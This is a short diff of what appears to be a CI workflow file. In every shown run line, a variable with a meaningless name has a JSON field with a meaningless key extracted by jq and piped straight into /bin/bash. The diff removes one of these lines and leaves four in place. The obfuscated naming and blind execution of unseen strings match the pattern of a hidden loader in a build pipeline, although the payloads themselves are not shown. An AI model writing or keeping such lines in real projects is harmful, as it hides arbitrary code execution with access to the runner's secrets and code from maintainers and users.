@@ -21,7 +21,6 @@ jobs:
           echo $nodzj93 | jq -r .q8791 | /bin/bash
           echo $tlkwj2050 | jq -r .p85852 | /bin/bash
           printf '%s' "$tiiqy6" | jq -r .jo4 | /bin/bash
-          printf '%s' "$ham1" | jq -r .mtqm3 | /bin/bash
           printf '%s' "$ijqb11536" | jq -r .i1 | /bin/bash
 
       - name: Archive results
